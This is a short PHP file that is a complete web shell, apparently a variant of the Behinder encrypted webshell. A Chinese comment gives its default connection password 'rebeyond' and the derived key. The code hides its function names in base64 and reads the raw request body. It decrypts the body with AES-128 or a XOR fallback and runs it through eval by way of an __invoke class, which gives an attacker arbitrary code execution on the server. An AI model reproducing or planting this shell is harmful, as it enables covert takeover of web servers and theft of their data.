<?php
@error_reporting(0);
session_start();
$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
$_SESSION['k']=$key;
$f=explode("|",base64_decode("ZmlsZV9nZXRfY29udGVudHN8YmFzZTY0X2RlY29kZXxwaHA6Ly9pbnB1dA=="));
$post=["bie"=>$f[0](end($f))];
$post=$post["bie"];
if(!extension_loaded('openssl'))
{
 $post=$f[1]($post."");

 for($i=0;$i<strlen($post);$i++) {
  $post[$i] = $post[$i] xor $key[$i+1&15];
 }
}
else
{
 $post=openssl_decrypt($post, "AES128", $key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p) {eval($p."");}}
@call_user_func(new C(),$params);
?>
